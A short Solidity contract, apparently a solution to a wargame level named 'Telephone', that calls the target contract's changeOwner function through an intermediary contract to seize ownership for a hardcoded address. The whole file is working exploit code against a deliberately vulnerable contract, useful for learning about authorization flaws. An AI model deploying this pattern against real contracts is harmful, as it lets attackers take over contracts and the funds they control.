pragma solidity ^0.6.0;
import "./Telephone.sol";

contract TelephoneAttack {
    Telephone public telephone;

    constructor(address _telephoneAddr) public {
        telephone = Telephone(_telephoneAddr);
    }

    function call() public {
        telephone.changeOwner(0xED99A1FD9Ca123Fd95500c2c1aFb6c3cFEAF541f);
    }
}